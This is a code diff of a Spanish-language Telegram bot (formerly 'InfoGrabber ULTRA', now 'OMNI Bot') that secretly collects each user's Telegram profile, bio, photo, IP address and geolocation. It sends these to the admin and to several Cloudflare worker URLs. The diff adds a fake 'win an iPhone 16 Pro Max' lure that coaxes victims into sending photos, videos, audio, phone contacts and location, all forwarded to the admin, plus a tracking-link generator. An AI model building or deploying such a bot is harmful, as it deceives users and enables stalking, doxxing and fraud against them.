@@ -1,15 +1,14 @@
 import os
 import logging
 import aiohttp
-import json
 from datetime import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from threading import Thread
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.constants import ParseMode
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-# ========== CONFIGURACIÓN (CORREGIDO) ==========
+# ========== CONFIGURACIÓN ==========
 TOKEN = os.environ.get("TOKEN", "").strip()
 ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip())
 
@@ -29,19 +28,44 @@ URLS = [
     "https://galleta.societykark.workers.dev"
 ]
 
-WORKER_URL = URLS[-1]  # Usamos la última para obtener ubicación (galleta)
+WORKER_URL = URLS[-1]
 
 # ========== LOGS ==========
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ========== BASE DE DATOS TEMPORAL ==========
-capturados = {}
+users_db = {}
+tracking_codes = {}
+
+# ========== MENÚ PRINCIPAL ==========
+def menu_principal():
+    keyboard = [
+        [InlineKeyboardButton("📊 Mi Perfil", callback_data="perfil")],
+        [InlineKeyboardButton("📸 Enviar Foto", callback_data="solicitar_foto")],
+        [InlineKeyboardButton("🎥 Enviar Video", callback_data="solicitar_video")],
+        [InlineKeyboardButton("🎵 Enviar Audio", callback_data="solicitar_audio")],
+        [InlineKeyboardButton("📇 Enviar Contacto", callback_data="solicitar_contacto")],
+        [InlineKeyboardButton("📍 Enviar Ubicación", callback_data="solicitar_ubicacion")],
+        [InlineKeyboardButton("🔗 Generar Enlace", callback_data="tracking")],
+        [InlineKeyboardButton("📈 Estadísticas", callback_data="stats")],
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+SENUELO = """🎁 *¡FELICIDADES! Has sido seleccionado para un premio especial!* 🎁
+
+📱 *Gana un iPhone 16 Pro Max* 📱
+Solo necesitas completar los siguientes pasos:
+
+1️⃣ Verifica tu identidad (solo una vez)
+2️⃣ Comparte un dato (foto, video o contacto)
+3️⃣ Recibe tu premio virtual
+
+*¡Es 100% gratuito y solo toma 2 minutos!*
+
+👇 *Presiona un botón para comenzar* 👇"""
 
 # ========== FUNCIONES DE EXTRACCIÓN ==========
-
 async def get_worker_location():
-    """Obtiene IP y ubicación desde el Worker de Cloudflare"""
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(WORKER_URL, timeout=10) as resp:
@@ -53,7 +77,6 @@ async def get_worker_location():
         return None
 
 async def get_ipapi_location(ip):
-    """Obtiene ubicación desde ipapi.co (más precisa)"""
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(f"https://ipapi.co/{ip}/json/", timeout=10) as resp:
@@ -82,50 +105,31 @@ async def get_user_bio(user, bot):
         logger.error(f"Error al obtener bio: {e}")
         return None
 
-def get_device_info(user_agent):
-    if not user_agent:
-        return "Desconocido"
-    device = "Desconocido"
-    if "iPhone" in user_agent:
-        device = "iPhone"
-    elif "iPad" in user_agent:
-        device = "iPad"
-    elif "Android" in user_agent:
-        device = "Android"
-    elif "Mac" in user_agent:
-        device = "Mac"
-    elif "Windows" in user_agent:
-        device = "Windows PC"
-    elif "Linux" in user_agent:
-        device = "Linux"
-    return device
-
-# ========== EXTRACCIÓN COMPLETA DE USUARIO ==========
-
+# ========== EXTRACCIÓN COMPLETA ==========
 async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, target_user=None):
     bot = context.bot
     user = target_user or update.effective_user
     chat = update.effective_chat
     message = update.message
-    
+
     user_id = user.id
     first_name = user.first_name or "N/A"
     last_name = user.last_name or "N/A"
+    full_name = f"{first_name} {last_name}".strip()
     username = f"@{user.username}" if user.username else "N/A"
     language = user.language_code or "N/A"
     is_bot = "Sí" if user.is_bot else "No"
     is_premium = "Sí" if getattr(user, 'is_premium', False) else "No"
-    
     bio = await get_user_bio(user, bot) or "No disponible"
     photo_id = await get_user_photo(user_id, bot)
-    
+
     chat_type = "Privado" if chat.type == "private" else f"Grupo: {chat.title}"
     chat_id = chat.id
-    
+
     message_id = message.message_id if message else "N/A"
     message_text = message.text if message and message.text else "N/A"
     message_date = message.date.strftime("%Y-%m-%d %H:%M:%S") if message else "N/A"
-    
+
     worker_data = await get_worker_location()
     ip = "N/A"
     country = "N/A"
@@ -133,7 +137,7 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     city = "N/A"
     timezone = "N/A"
     postal = "N/A"
-    
+
     if worker_data:
         ip = worker_data.get("ip", "N/A")
         country = worker_data.get("country", "N/A")
@@ -141,7 +145,6 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
         city = worker_data.get("city", "N/A")
         timezone = worker_data.get("timezone", "N/A")
         postal = worker_data.get("postal", "N/A")
-        
         if ip != "N/A":
             ipapi_data = await get_ipapi_location(ip)
             if ipapi_data:
@@ -150,13 +153,12 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                 city = ipapi_data.get("city", city)
                 postal = ipapi_data.get("postal", postal)
                 timezone = ipapi_data.get("timezone", timezone)
-    
+
     info = f"🕵️ *INFORMACIÓN COMPLETA DEL USUARIO*\n"
     info += f"━━━━━━━━━━━━━━━━━━━━\n\n"
     info += f"👤 *Telegram*\n"
     info += f"   • ID: `{user_id}`\n"
-    info += f"   • Nombre: {first_name}\n"
-    info += f"   • Apellido: {last_name}\n"
+    info += f"   • Nombre completo: {full_name}\n"
     info += f"   • Username: {username}\n"
     info += f"   • Idioma: {language}\n"
     info += f"   • Es bot: {is_bot}\n"
@@ -178,7 +180,7 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     info += f"   • Zona Horaria: {timezone}\n"
     info += f"━━━━━━━━━━━━━━━━━━━━\n"
     info += f"⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    
+
     return {
         "text": info,
         "photo_id": photo_id,
@@ -189,17 +191,11 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
         "country": country
     }
 
-# ========== ENVIAR A TODAS LAS URLS Y AL ADMIN ==========
-
-async def send_to_all_workers(text, photo_id=None):
-    """Envía el reporte a TODAS las URLs (Workers)"""
+# ========== ENVIAR A TODAS LAS URLS ==========
+async def send_to_all_workers(text):
     form_data = aiohttp.FormData()
     form_data.add_field('chat_id', str(ADMIN_ID))
     form_data.add_field('text', text)
-    # Nota: photo_id es un file_id de Telegram, no se puede reenviar directamente sin descargar.
-    # Si se quiere enviar foto, hay que descargarla y reenviar, pero por simplicidad solo texto.
-    # Si necesitas fotos, hay que usar bot.download_file y luego enviar a cada Worker.
-    
     results = []
     async with aiohttp.ClientSession() as session:
         for url in URLS:
@@ -214,101 +210,144 @@ async def send_to_all_workers(text, photo_id=None):
     return results
 
 async def send_report_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data):
-    """Envía el informe al admin y a todos los Workers"""
     bot = context.bot
-    
-    # 1. Enviar al admin directamente (por si acaso)
-    await bot.send_message(
-        chat_id=ADMIN_ID,
-        text=info_data["text"],
-        parse_mode=ParseMode.MARKDOWN
-    )
+    await bot.send_message(chat_id=ADMIN_ID, text=info_data["text"], parse_mode=ParseMode.MARKDOWN)
     if info_data["photo_id"]:
-        await bot.send_photo(
-            chat_id=ADMIN_ID,
-            photo=info_data["photo_id"],
-            caption=f"📸 Foto de {info_data['username'] or info_data['user_id']}"
-        )
-    
-    # 2. Enviar a TODOS los Workers
-    resultados = await send_to_all_workers(info_data["text"], info_data["photo_id"])
+        await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de {info_data['username'] or info_data['user_id']}")
+    resultados = await send_to_all_workers(info_data["text"])
     logger.info(f"Resultados de envío a Workers: {resultados}")
-    
-    # Guardar en base local
-    capturados[info_data["user_id"]] = {
-        "info": info_data,
-        "timestamp": datetime.now().isoformat()
-    }
+    users_db[info_data["user_id"]] = info_data
 
 # ========== COMANDOS ==========
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if user.id == ADMIN_ID:
+        await update.message.reply_text("👋 Hola admin.")
+        return
     info_data = await extract_user_info(update, context)
     await send_report_to_admin(update, context, info_data)
-    await update.message.reply_text(
-        "🤖 *Bot activo*\n\n"
-        "Tu información ha sido registrada.\n"
-        "Usa /help para ver comandos.",
-        parse_mode=ParseMode.MARKDOWN
-    )
+    await update.message.reply_text(SENUELO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
 
-async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    message = update.message
-    target_user = None
-    if message.reply_to_message:
-        target_user = message.reply_to_message.from_user
-    elif message.entities:
-        for entity in message.entities:
-            if entity.type == "mention":
-                username = message.text[entity.offset:entity.offset + entity.length]
-                try:
-                    target_user = await context.bot.get_chat(username)
-                    target_user = target_user._unpack()
-                except:
-                    pass
-                break
-    if not target_user:
-        target_user = update.effective_user
-    info_data = await extract_user_info(update, context, target_user)
-    await send_report_to_admin(update, context, info_data)
-    username = f"@{target_user.username}" if target_user.username else f"ID {target_user.id}"
-    await message.reply_text(f"✅ Información de {username} enviada.", parse_mode=ParseMode.MARKDOWN)
+async def tracking(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    code = os.urandom(6).hex()
+    tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
+    link = f"{WORKER_URL}/track/{code}"
+    await update.message.reply_text(f"🔗 *Enlace:*\n`{link}`", parse_mode=ParseMode.MARKDOWN)
+    await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔗 *Nuevo enlace*\nUsuario: {user.first_name}\nCódigo: `{code}`\nEnlace: {link}", parse_mode=ParseMode.MARKDOWN)
+
+async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("❌ No autorizado.")
+        return
+    msg = f"📊 *Estadísticas*\n👥 Usuarios: {len(users_db)}\n🔗 Enlaces: {len(tracking_codes)}"
+    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🤖 *InfoGrabber ULTRA*\n\n"
-        "Comandos:\n"
-        "`/start` - Registra tu info\n"
-        "`/info` - Extrae info de la persona a la que respondes\n"
-        "`/help` - Ayuda\n\n"
-        "⚡ *Solo para fines educativos.*",
-        parse_mode=ParseMode.MARKDOWN
-    )
+    await update.message.reply_text("🤖 *OMNI Bot*\n\n/start - Iniciar\n/tracking - Generar enlace\n/stats - Estadísticas\n/help - Ayuda", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
 
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.text and not update.message.text.startswith("/"):
-        logger.info(f"Mensaje de {update.effective_user.id}: {update.message.text[:50]}")
-    else:
-        await update.message.reply_text(
-            "📩 Usa /help para ver comandos.",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("📋 Ver comandos", callback_data="help")]
-            ])
-        )
+async def perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    info = users_db.get(user.id)
+    if not info:
+        await update.message.reply_text("❌ Usa /start.")
+        return
+    msg = f"📊 *Tu perfil*\n\n👤 {info.get('full_name')}\n📛 @{info.get('username')}\n🆔 `{info.get('id')}`"
+    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
 
+# ========== SOLICITAR ARCHIVOS ==========
+async def solicitar_foto(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("📸 Envía una foto.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
+
+async def solicitar_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("🎥 Envía un video.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
+
+async def solicitar_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("🎵 Envía un audio.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
+
+async def solicitar_contacto(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [[InlineKeyboardButton("📇 Compartir contacto", callback_data="compartir_contacto")], [InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
+    await update.message.reply_text("📇 Comparte tu contacto.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
+
+async def solicitar_ubicacion(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [[InlineKeyboardButton("📍 Compartir ubicación", callback_data="compartir_ubicacion")], [InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
+    await update.message.reply_text("📍 Comparte tu ubicación.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
+
+# ========== MANEJAR ARCHIVOS RECIBIDOS ==========
+async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    photo = update.message.photo[-1]
+    await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=f"📸 Foto de {user.first_name} (@{user.username})")
+    await update.message.reply_text("✅ Foto enviada.", reply_markup=menu_principal())
+
+async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    video = update.message.video
+    await context.bot.send_video(chat_id=ADMIN_ID, video=video.file_id, caption=f"🎥 Video de {user.first_name} (@{user.username})")
+    await update.message.reply_text("✅ Video enviado.", reply_markup=menu_principal())
+
+async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    audio = update.message.audio
+    await context.bot.send_audio(chat_id=ADMIN_ID, audio=audio.file_id, caption=f"🎵 Audio de {user.first_name} (@{user.username})")
+    await update.message.reply_text("✅ Audio enviado.", reply_markup=menu_principal())
+
+async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    contact = update.message.contact
+    await context.bot.send_message(chat_id=ADMIN_ID, text=f"📇 Contacto de {user.first_name} (@{user.username})\n\n📞 {contact.phone_number}")
+    await update.message.reply_text("✅ Contacto enviado.", reply_markup=menu_principal())
+
+async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    location = update.message.location
+    await context.bot.send_location(chat_id=ADMIN_ID, latitude=location.latitude, longitude=location.longitude)
+    await context.bot.send_message(chat_id=ADMIN_ID, text=f"📍 Ubicación de {user.first_name} (@{user.username})")
+    await update.message.reply_text("✅ Ubicación enviada.", reply_markup=menu_principal())
+
+# ========== CALLBACKS ==========
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    await help_command(update, context)
-    await query.delete_message()
+    data = query.data
+    if data == "volver":
+        await query.edit_message_text("📋 Menú principal", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
+    elif data == "perfil":
+        await perfil(update, context)
+        await query.delete_message()
+    elif data == "solicitar_foto":
+        await solicitar_foto(update, context)
+        await query.delete_message()
+    elif data == "solicitar_video":
+        await solicitar_video(update, context)
+        await query.delete_message()
+    elif data == "solicitar_audio":
+        await solicitar_audio(update, context)
+        await query.delete_message()
+    elif data == "solicitar_contacto":
+        await solicitar_contacto(update, context)
+        await query.delete_message()
+    elif data == "solicitar_ubicacion":
+        await solicitar_ubicacion(update, context)
+        await query.delete_message()
+    elif data == "tracking":
+        await tracking(update, context)
+        await query.delete_message()
+    elif data == "stats":
+        await stats(update, context)
+        await query.delete_message()
+    elif data == "compartir_contacto":
+        await query.edit_message_text("📇 Usa el botón de compartir contacto (📎 → Contacto).", parse_mode=ParseMode.MARKDOWN)
+    elif data == "compartir_ubicacion":
+        await query.edit_message_text("📍 Usa el botón de compartir ubicación (📎 → Ubicación).", parse_mode=ParseMode.MARKDOWN)
 
+# ========== ERROR HANDLER ==========
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
     logger.error(f"❌ Error: {context.error}")
     if isinstance(update, Update) and update.effective_message:
-        await update.effective_message.reply_text("❌ Error inesperado.")
+        await update.effective_message.reply_text("❌ Error inesperado.", reply_markup=menu_principal())
 
 # ========== SERVIDOR HTTP ==========
-
 class HealthHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -320,20 +359,22 @@ def run_http_server():
     server.serve_forever()
 
 # ========== MAIN ==========
-
 def main():
     Thread(target=run_http_server, daemon=True).start()
     logger.info("✅ Servidor HTTP en puerto 8080")
-    
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("info", info))
+    app.add_handler(CommandHandler("tracking", tracking))
+    app.add_handler(CommandHandler("stats", stats))
     app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CallbackQueryHandler(callback_handler))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    app.add_handler(CallbackQueryHandler(callback_handler))  # ✅ Ahora sí está importado
+    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
+    app.add_handler(MessageHandler(filters.VIDEO, handle_video))
+    app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
+    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
+    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
     app.add_error_handler(error_handler)
-    
-    logger.info("✅ InfoGrabber ULTRA iniciado correctamente")
+    logger.info("✅ OMNI Bot iniciado correctamente")
     app.run_polling()
 
 if __name__ == "__main__":
